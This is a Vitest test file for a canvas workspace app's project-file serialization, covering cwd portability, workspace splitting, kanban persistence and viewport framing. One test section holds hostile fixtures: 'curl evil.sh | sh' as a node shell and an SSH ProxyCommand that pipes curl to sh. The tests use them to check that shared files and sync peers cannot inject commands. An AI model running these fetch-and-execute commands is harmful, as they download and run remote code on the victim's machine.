import { describe, it, expect } from 'vitest'
import type { CanvasNodeState, Project, Workspace } from '../shared/types'
import {
  toPortableNodes, resolveNodes, projectToFile, fileToProject, framingViewport,
  sameProjectContent, splitWorkspace, serializeProjectFile
} from './workspace-files'
import { legacyFileId } from '../shared/project-id'
import type { ProjectFileV1 } from './workspace-files'

const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc', kind: 'terminal', position: { x: 0, y: 0 },
  size: { width: 400, height: 300 }, title: 't', color: '#fff', group: null, ...over
})
const project = (over: Partial<Project> = {}): Project => ({
  id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
  nodes: [node()], ...over
})

describe('portable node cwds', () => {
  it('relativizes cwds under the root with a ./ prefix and resolves them back', () => {
    const nodes = [node({ cwd: '/Users/enes/projects/foo/sub' })]
    const portable = toPortableNodes(nodes, '/Users/enes/projects/foo')
    expect(portable[0].cwd).toBe('./sub')
    expect(resolveNodes(portable, '/mnt/other/foo')[0].cwd).toBe('/mnt/other/foo/sub')
  })
  it('the root itself becomes "." ', () => {
    const portable = toPortableNodes([node({ cwd: '/a/b' })], '/a/b')
    expect(portable[0].cwd).toBe('.')
    expect(resolveNodes(portable, '/x')[0].cwd).toBe('/x')
  })
  it('paths outside the root stay absolute, cwd-less nodes untouched', () => {
    const portable = toPortableNodes([node({ cwd: '/elsewhere' }), node({ id: 'n2' })], '/a/b')
    expect(portable[0].cwd).toBe('/elsewhere')
    expect(portable[1].cwd).toBeUndefined()
    expect(resolveNodes(portable, '/a/b')[0].cwd).toBe('/elsewhere')
  })
})

describe('projectToFile / fileToProject round-trip', () => {
  it('drops cwd/closed/unavailable, keeps nodes/session state, restores from base', () => {
    const p = project({
      cwd: '/a/b', closed: true, defaultAccountId: 'acct1', dinoHighScore: 7,
      nodes: [node({ cwd: '/a/b/x', agentId: 'claude', accountId: 'acct1' })],
      bridges: [{ id: 'e1', source: 's', target: 't' }]
    })
    const f = projectToFile(p, 3, '2026-07-11T00:00:00.000Z')
    expect(f.version).toBe(1); expect(f.rev).toBe(3)
    expect((f as any).cwd).toBeUndefined(); expect((f as any).closed).toBeUndefined()
    expect(f.nodes[0].cwd).toBe('./x')
    // Machine-local: identity, camera and account come from the index entry, never the file.
    expect(f.id).not.toBe('p1')
    expect(f.viewport).toEqual(framingViewport(f.nodes)) // content-derived, not this user's camera
    expect(f.defaultAccountId).toBeUndefined()
    const back = fileToProject(f, {
      id: 'p1', cwd: '/new/root', closed: true,
      viewport: { x: 5, y: 6, zoom: 2 }, defaultAccountId: 'acct1'
    })
    expect(back).toMatchObject({
      id: 'p1', cwd: '/new/root', closed: true, defaultAccountId: 'acct1', dinoHighScore: 7,
      viewport: { x: 5, y: 6, zoom: 2 }
    })
    expect(back.nodes[0]).toMatchObject({ cwd: '/new/root/x', agentId: 'claude', accountId: 'acct1' })
    expect(back.unavailable).toBeUndefined()
  })
})

describe('sameProjectContent', () => {
  it('ignores rev and savedAt, sees node changes', () => {
    const a = projectToFile(project(), 1, '2026-01-01T00:00:00.000Z')
    const b = projectToFile(project(), 9, '2026-02-02T00:00:00.000Z')
    expect(sameProjectContent(a, b)).toBe(true)
    const c = projectToFile(project({ nodes: [node({ title: 'renamed' })] }), 1, a.savedAt)
    expect(sameProjectContent(a, c)).toBe(false)
  })
})

describe('splitWorkspace', () => {
  const ws: Workspace = {
    version: 2, activeProjectId: 'p1',
    projects: [
      project({ id: 'p1', cwd: '/a/foo' }),
      project({ id: 'p2', name: 'canvas-only' }),
      project({ id: 'p3', ssh: { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' } })
    ]
  }
  it('local-cwd → ref entry + file; cwd-less → inline; ssh → ssh entry + cache', () => {
    const { index, files } = splitWorkspace(ws, () => 1, '2026-07-11T00:00:00.000Z')
    expect(index.version).toBe(3)
    expect(index.activeProjectId).toBe('p1')
    expect(index.entries[0]).toMatchObject({ id: 'p1', name: 'foo', cwd: '/a/foo' })
    expect(index.entries[0].project).toBeUndefined()
    // The id lives in the ENTRY; the file gets only the machine-independent legacy field.
    expect(files.get('/a/foo')!.id).not.toBe('p1')
    expect(files.get('/a/foo')!.id).toBe(legacyFileId('foo'))
    expect(index.entries[1].project!.id).toBe('p2')
    expect(index.entries[2].ssh!.remoteCwd).toBe('~/app')
    // …except the ssh mirror, whose id `reconcileSsh` still reads as a lineage marker.
    expect(index.entries[2].cache!.id).toBe('p3')
    expect(files.has('~/app')).toBe(false) // ssh files are not local writes
  })
  it('two projects on the same cwd → one file + one inline entry (no last-wins clobber)', () => {
    const shared: Workspace = {
      version: 2, activeProjectId: 'a',
      projects: [
        project({ id: 'a', name: 'first', cwd: '/a/foo' }),
        project({ id: 'b', name: 'second', cwd: '/a/foo' })
      ]
    }
    const { index, files } = splitWorkspace(shared, () => 1, '2026-07-11T00:00:00.000Z')
    expect(files.size).toBe(1) // only the first claims the file
    expect(files.get('/a/foo')!.name).toBe('first')
    expect(index.entries[0]).toMatchObject({ id: 'a', cwd: '/a/foo' })
    expect(index.entries[0].project).toBeUndefined()
    // The second is kept verbatim inline — no file, nothing lost.
    expect(index.entries[1].cwd).toBeUndefined()
    expect(index.entries[1].project).toMatchObject({ id: 'b', name: 'second', cwd: '/a/foo' })
    expect(index.entries[1].project!.unavailable).toBeUndefined()
  })

  it('two DIFFERENT folders under one id → two entries, two files, neither clobbering the other', () => {
    // The last-resort guard for a duplicate id that reached save without going through the
    // store's load repair (a hand-edited index, a runtime collision). Keying only by cwd let both
    // entries keep the id, and every id-keyed lookup downstream resolved to the first one.
    const collided: Workspace = {
      version: 2, activeProjectId: 'dup',
      projects: [
        project({ id: 'dup', name: 'first', cwd: '/a/foo', nodes: [node({ id: 'term-a' })] }),
        project({ id: 'dup', name: 'second', cwd: '/a/bar', nodes: [node({ id: 'term-b' })] })
      ]
    }
    const { index, files } = splitWorkspace(collided, () => 1, '2026-07-11T00:00:00.000Z')
    expect(index.entries).toHaveLength(2)
    expect(index.entries[0].id).toBe('dup') // first holder keeps it
    expect(index.entries[1].id).not.toBe('dup')
    expect(files.size).toBe(2)
    // Neither file names a project any more — only the folder they sit in does.
    expect(files.get('/a/foo')!.id).toBe(legacyFileId('first'))
    expect(files.get('/a/bar')!.id).toBe(legacyFileId('second'))
    expect(files.get('/a/foo')!.nodes.map((n) => n.id)).toEqual(['term-a'])
    expect(files.get('/a/bar')!.nodes.map((n) => n.id)).toEqual(['term-b'])
  })

  it('the re-key is deterministic (same input, same index) — a save loop must not churn the file', () => {
    const collided: Workspace = {
      version: 2, activeProjectId: 'dup',
      projects: [project({ id: 'dup', cwd: '/a/foo' }), project({ id: 'dup', cwd: '/a/bar' })]
    }
    const once = splitWorkspace(collided, () => 1, '2026-07-11T00:00:00.000Z')
    const twice = splitWorkspace(collided, () => 1, '2026-07-11T00:00:00.000Z')
    expect(twice.index.entries[1].id).toBe(once.index.entries[1].id)
  })

  it('same id AND same cwd still takes the inline escape hatch (no second file)', () => {
    const collided: Workspace = {
      version: 2, activeProjectId: 'dup',
      projects: [
        project({ id: 'dup', name: 'first', cwd: '/a/foo' }),
        project({ id: 'dup', name: 'second', cwd: '/a/foo' })
      ]
    }
    const { index, files } = splitWorkspace(collided, () => 1, '2026-07-11T00:00:00.000Z')
    expect(files.size).toBe(1)
    expect(index.entries[1].project).toBeTruthy()
    expect(index.entries[1].id).not.toBe('dup')
    expect(index.entries[1].project!.id).toBe(index.entries[1].id)
  })

  it('two ssh entries under one id get distinct ids and distinct caches', () => {
    const sshOf = (remoteCwd: string) => ({ server: { host: 'h', user: 'u' } as any, remoteCwd })
    const collided: Workspace = {
      version: 2, activeProjectId: 'dup',
      projects: [
        project({ id: 'dup', name: 'first', ssh: sshOf('~/one') }),
        project({ id: 'dup', name: 'second', ssh: sshOf('~/two') })
      ]
    }
    const { index } = splitWorkspace(collided, () => 1, '2026-07-11T00:00:00.000Z')
    expect(index.entries[0].id).toBe('dup')
    expect(index.entries[1].id).not.toBe('dup')
    expect(index.entries[1].cache!.id).toBe(index.entries[1].id)
  })

  it('never persists the runtime unavailable flag inline', () => {
    const { index } = splitWorkspace(
      { version: 2, activeProjectId: 'x', projects: [project({ id: 'x', unavailable: true })] },
      () => 1, '2026-07-11T00:00:00.000Z')
    expect(index.entries[0].project!.unavailable).toBeUndefined()
  })
  it('never persists a remote (relay) project — no ref, no inline, no cache, in any branch', () => {
    const ws2: Workspace = {
      version: 2, activeProjectId: 'keep',
      projects: [
        project({ id: 'keep', name: 'normal', cwd: '/a/foo' }),
        project({ id: 'r1', name: 'relay-cwdless', remote: true }),
        project({ id: 'r2', name: 'relay-cwd', cwd: '/a/bar', remote: true }),
        project({ id: 'r3', name: 'relay-ssh', ssh: { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }, remote: true })
      ]
    }
    const { index, files } = splitWorkspace(ws2, () => 1, '2026-07-11T00:00:00.000Z')
    // Only the normal project is emitted; every relay project is absent entirely.
    expect(index.entries.map((e) => e.id)).toEqual(['keep'])
    expect(files.has('/a/bar')).toBe(false) // relay cwd never written as a file
  })
  it('an unavailable ref is header-only: no file (local cwd) and no cache (ssh)', () => {
    const local = splitWorkspace(
      { version: 2, activeProjectId: 'p1', projects: [project({ id: 'p1', cwd: '/a/foo', unavailable: true })] },
      () => 1, '2026-07-11T00:00:00.000Z')
    expect(local.index.entries[0]).toMatchObject({ id: 'p1', name: 'foo', cwd: '/a/foo' })
    expect(local.files.has('/a/foo')).toBe(false) // no placeholder file written over real data
    const remote = splitWorkspace(
      { version: 2, activeProjectId: 'p1', projects: [project({ id: 'p1', ssh: { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }, unavailable: true })] },
      () => 1, '2026-07-11T00:00:00.000Z')
    expect(remote.index.entries[0]).toMatchObject({ id: 'p1', ssh: { remoteCwd: '~/app' } })
    expect(remote.index.entries[0].cache).toBeUndefined() // no cache fabricated from the placeholder
  })
})

describe('serializeProjectFile', () => {
  it('is pretty-printed with version first (stable git diffs)', () => {
    const s = serializeProjectFile(projectToFile(project(), 1, '2026-07-11T00:00:00.000Z'))
    expect(s.startsWith('{\n  "version": 1,\n  "rev": 1,')).toBe(true)
  })
})

describe('permission mode persistence', () => {
  const base = {
    id: 'p1',
    name: 'proj',
    color: '#fff',
    viewport: { x: 0, y: 0, zoom: 1 },
    nodes: []
  }

  it('round-trips a project permission-mode override', () => {
    const file = projectToFile({ ...base, defaultPermissionMode: 'plan' }, 1, 'now')
    expect(file.defaultPermissionMode).toBe('plan')
    expect(fileToProject(file, { id: 'p1' }).defaultPermissionMode).toBe('plan')
  })

  it('omits the key entirely when there is no override', () => {
    const file = projectToFile(base, 1, 'now')
    expect('defaultPermissionMode' in file).toBe(false)
    expect(fileToProject(file, { id: 'p1' }).defaultPermissionMode).toBeUndefined()
  })
})

describe('exec-enabling node fields never travel in the shared project file', () => {
  const hostileNodes = [
    node({ id: 'n1', shell: 'curl evil.sh | sh' }),
    node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
  ]

  it('projectToFile strips shell + ssh.extraArgs (a teammate who clones gets no command)', () => {
    const file = projectToFile(project({ cwd: '/a/b', nodes: hostileNodes }), 1, 'now')
    expect(file.nodes[0].shell).toBeUndefined()
    expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
    expect(serializeProjectFile(file)).not.toContain('ProxyCommand')
    // the connection itself still persists (a node must reattach to its host)
    expect(file.nodes[1].ssh?.host).toBe('h')
  })

  it('fileToProject with no local overlay drops what the FILE claimed (adopted/cloned folder)', () => {
    const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
    const p = fileToProject(f, { id: 'p1', cwd: '/a/b' })
    expect(p.nodes[0].shell).toBeUndefined()
    expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
  })

  it("fileToProject restores only THIS machine's values (from the local index entry)", () => {
    const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
    const p = fileToProject(f, { id: 'p1', cwd: '/a/b', localExec: { n1: { shell: '/bin/zsh' } } })
    expect(p.nodes[0].shell).toBe('/bin/zsh')
    expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
  })

  it('splitWorkspace keeps the local values in the machine-local index, not in the file', () => {
    const p = project({
      cwd: '/a/b',
      nodes: [
        node({ id: 'n1', shell: '/bin/zsh' }),
        // execTrusted: the local producer (the user's SSH server store) set this value — see
        // @shared/node-exec. Without the marker an exec-enabling arg is NOT blessed into the
        // machine-local index (the case below), which is what stops a canvas-sync peer from
        // laundering one in.
        node({
          id: 'n2',
          ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h', execTrusted: true }
        })
      ]
    })
    const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
    const { index, files } = splitWorkspace(ws, () => 1, 'now')
    expect(index.entries[0].localExec).toEqual({
      n1: { shell: '/bin/zsh' },
      n2: { sshExtraArgs: '-o ProxyCommand=corp %h' }
    })
    const file = files.get('/a/b')!
    expect(file.nodes[0].shell).toBeUndefined()
    expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
    // and the round trip through the index restores them for the local user
    const back = fileToProject(file, { id: 'p1', cwd: '/a/b', localExec: index.entries[0].localExec })
    expect(back.nodes[0].shell).toBe('/bin/zsh')
    expect(back.nodes[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
  })

  // C2: the laundering path. A canvas-sync peer's node is applied to the live array, and the next
  // save used to harvest ITS exec fields into the machine-local index — where they are re-attached
  // as this machine's own on every load, surviving the peer leaving and the app restarting. The
  // inbound strip (@shared/canvas-mutations) is the primary guard; this asserts the store itself
  // also refuses to bless a value no local producer vouched for.
  it('splitWorkspace never blesses an exec value a local producer did not set', () => {
    const p = project({
      cwd: '/a/b',
      nodes: [
        node({ id: 'n1', shell: 'curl evil.sh | sh' }),
        node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil|sh' } })
      ]
    })
    const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
    const { index } = splitWorkspace(ws, () => 1, 'now')
    expect(index.entries[0].localExec).toBeUndefined()
  })
})

describe('kanban board persistence', () => {
  const board = {
    columns: [
      { id: 'kcol-a', title: 'To Do', color: '#0a84ff' },
      { id: 'kcol-b', title: 'Done', color: '#32d74b' }
    ],
    assignments: [{ nodeId: 'term-abc', columnId: 'kcol-a' }],
    meta: [{ nodeId: 'term-abc', assignees: [{ name: 'enes', color: '#0a84ff' }], dueAt: 1784500000000 }]
  }
  it('rides the project file round-trip', () => {
    const f = projectToFile(project({ kanban: board }), 1, '2026-07-18T00:00:00.000Z')
    expect(f.kanban).toEqual(board)
    expect(fileToProject(f, { id: 'p1' }).kanban).toEqual(board)
  })
  it('absent stays absent — no key is written (lazy default rule)', () => {
    const f = projectToFile(project(), 1, '2026-07-18T00:00:00.000Z')
    expect('kanban' in f).toBe(false)
    expect('kanban' in fileToProject(f, { id: 'p1' })).toBe(false)
  })
  it('board edits break content equality (rev bumps) and survive splitWorkspace (both shells + ssh cache)', () => {
    const a = projectToFile(project({ kanban: board }), 1, '2026-01-01T00:00:00.000Z')
    const b = projectToFile(project(), 1, '2026-01-01T00:00:00.000Z')
    expect(sameProjectContent(a, b)).toBe(false)
    const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [project({ cwd: '/a/b', kanban: board })] }
    const { files } = splitWorkspace(ws, () => 1, '2026-01-01T00:00:00.000Z')
    expect(files.get('/a/b')?.kanban).toEqual(board)
  })
  it('a malformed or v1-shaped kanban from a hand-edited file is dropped, not carried', () => {
    const f = projectToFile(project(), 1, '2026-07-18T00:00:00.000Z')
    const evil1 = { ...f, kanban: {} } as unknown as ProjectFileV1
    const evil2 = { ...f, kanban: { columns: 42, assignments: [] } } as unknown as ProjectFileV1
    const v1shape = { ...f, kanban: { columns: [], cards: [] } } as unknown as ProjectFileV1
    expect('kanban' in fileToProject(evil1, { id: 'p1' })).toBe(false)
    expect('kanban' in fileToProject(evil2, { id: 'p1' })).toBe(false)
    expect('kanban' in fileToProject(v1shape, { id: 'p1' })).toBe(false)
  })
})

describe('the shared file carries content, not machine identity', () => {
  const p = project({
    id: 'project-mridky20-11', cwd: '/a/foo', name: 'shared', defaultAccountId: 'acct-1',
    viewport: { x: -400, y: 90, zoom: 0.6 }, dinoHighScore: 12,
    kanban: { columns: [], assignments: [] }
  })

  it('drops the id, the camera and the account — keeps everything a team shares', () => {
    const f = projectToFile(p, 1, 'now')
    expect(f.id).not.toBe('project-mridky20-11')
    expect(f.viewport).not.toEqual(p.viewport) // not this user's camera; a frame for the nodes
    expect(f.viewport).toEqual(framingViewport(f.nodes))
    expect(f.defaultAccountId).toBeUndefined()
    // Content a team WANTS: two people opening this repo should see the same board, the same
    // canvas, under the same name and color.
    expect(f).toMatchObject({ name: 'shared', color: p.color, dinoHighScore: 12 })
    expect(f.kanban).toEqual({ columns: [], assignments: [] })
  })

  it('the legacy id is derived from the canvas name, so every machine writes the same bytes', () => {
    const mine = projectToFile(p, 1, 'now')
    const theirs = projectToFile({ ...p, id: 'project-other-9', cwd: '/elsewhere/foo' }, 1, 'now')
    expect(theirs.id).toBe(mine.id)
    expect(serializeProjectFile(theirs)).toBe(serializeProjectFile(mine))
  })

  it('fileToProject takes identity from the caller and ignores what the file claims', () => {
    const f = { ...projectToFile(p, 1, 'now'), id: 'project-someone-else' }
    expect(fileToProject(f, { id: 'ours', cwd: '/a/foo' }).id).toBe('ours')
  })

  it('a legacy file\'s camera/account are read once (the upgrade path), the entry then wins', () => {
    const legacy = {
      ...projectToFile(p, 1, 'now'),
      viewport: { x: 1, y: 2, zoom: 3 },
      defaultAccountId: 'acct-legacy'
    }
    expect(fileToProject(legacy, { id: 'ours' })).toMatchObject({
      viewport: { x: 1, y: 2, zoom: 3 }, defaultAccountId: 'acct-legacy'
    })
    expect(fileToProject(legacy, {
      id: 'ours', viewport: { x: 9, y: 9, zoom: 9 }, defaultAccountId: 'acct-ours'
    })).toMatchObject({ viewport: { x: 9, y: 9, zoom: 9 }, defaultAccountId: 'acct-ours' })
  })

  it('splitWorkspace keeps the camera + account in the machine-local index entry', () => {
    const { index } = splitWorkspace(
      { version: 2, activeProjectId: p.id, projects: [p] }, () => 1, 'now'
    )
    expect(index.entries[0]).toMatchObject({
      id: 'project-mridky20-11', cwd: '/a/foo',
      viewport: { x: -400, y: 90, zoom: 0.6 }, defaultAccountId: 'acct-1'
    })
  })

  it('an unavailable ref writes NO camera (a placeholder must not forget where the user was)', () => {
    const { index } = splitWorkspace(
      { version: 2, activeProjectId: p.id, projects: [{ ...p, unavailable: true, nodes: [] }] },
      () => 1, 'now'
    )
    expect(index.entries[0].viewport).toBeUndefined()
  })
})

describe('framingViewport', () => {
  it('puts the top-left node just inside the corner of an adopted canvas', () => {
    const vp = framingViewport([node({ position: { x: 4000, y: 2000 } })])
    expect(vp.zoom).toBe(1)
    expect(vp.x + 4000).toBe(80)
    expect(vp.y + 2000).toBe(80)
  })
  it('an empty canvas (and a canvas of only children) stays at the origin', () => {
    expect(framingViewport([])).toEqual({ x: 0, y: 0, zoom: 1 })
    // A child's position is relative to its frame, so it can't anchor the camera.
    expect(framingViewport([node({ parentId: 'group-1', position: { x: 10, y: 10 } })]))
      .toEqual({ x: 0, y: 0, zoom: 1 })
  })

  // This value is written into the user's COMMITTED file on every save. The field it replaced was
  // the user's own viewport and could not be poisoned by node data; this one can, so a corrupt or
  // hand-edited position must not reach the file as NaN — which JSON.stringify writes as `null`,
  // and which a reader then hands to React Flow as a camera.
  it('a corrupt node position never reaches the file (no NaN, and the good axis still counts)', () => {
    const corrupt = [
      { ...node({ id: 'bad' }), position: { x: null, y: 75 } as unknown as { x: number; y: number } },
      node({ id: 'ok', position: { x: 300, y: 900 } })
    ]
    expect(framingViewport(corrupt)).toEqual({ x: 80 - 300, y: 80 - 75, zoom: 1 })
    // …and what actually lands on disk: JSON.stringify turns NaN into `null`, so the round trip
    // is the assertion that matters (the node's own corrupt position is preserved verbatim —
    // this file is not the place to silently rewrite the user's data).
    const written = JSON.parse(
      serializeProjectFile(projectToFile(project({ nodes: corrupt }), 1, 'now'))
    ) as ProjectFileV1
    expect(Number.isFinite(written.viewport!.x)).toBe(true)
    expect(Number.isFinite(written.viewport!.y)).toBe(true)
    expect(written.viewport).toEqual({ x: -220, y: 5, zoom: 1 })
  })

  it('every position corrupt (or missing) falls back to the origin, never NaN', () => {
    const junk = [
      { ...node({ id: 'a' }), position: undefined as unknown as { x: number; y: number } },
      { ...node({ id: 'b' }), position: { x: 'left', y: NaN } as unknown as { x: number; y: number } }
    ]
    expect(framingViewport(junk)).toEqual({ x: 0, y: 0, zoom: 1 })
  })

  // It runs inside projectToFile → splitWorkspace → save(), so a throw here fails the WHOLE save,
  // not one node. `Math.min(...nodes.map(…))` overflowed the call stack around 200k arguments.
  it('a canvas far past the argument limit still frames (a loop, not a spread)', () => {
    const many = Array.from({ length: 250_000 }, (_, i) => node({ id: `t${i}`, position: { x: i + 5, y: i + 9 } }))
    expect(framingViewport(many)).toEqual({ x: 75, y: 71, zoom: 1 })
  })
})
